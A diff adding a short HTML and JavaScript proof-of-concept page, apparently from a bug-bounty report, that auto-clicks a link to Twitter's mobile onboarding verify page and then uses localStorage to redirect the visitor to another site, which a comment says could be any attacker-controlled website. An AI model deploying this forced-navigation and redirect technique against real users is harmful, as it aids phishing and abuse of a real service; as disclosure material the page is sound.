@@ -1,0 +1,32 @@
+
+<html>
+<body>
+<a href="https://mobile.twitter.com/i/onboarding/verify" id="forceClick" onClick="forceClicked()" target="_self" >Click Me</a> 
+</body>
+<script>
+
+function forceClicked(){
+localStorage.setItem("ClickCount", 1);  //Setting up a value in local storage to detected user click
+}
+
+
+
+if(localStorage.getItem("ClickCount")==1)
+   {
+      localStorage.setItem("ClickCount", 0); 
+      if(localStorage.getItem("ClickCount")==0) 
+         {
+            window.location.replace("https://hackerone.com/twitter");  //This can any attacker controlled website
+         }
+
+
+   }
+else {
+
+document.getElementById("forceClick").click();
+
+}
+
+
+</script>
+</html>
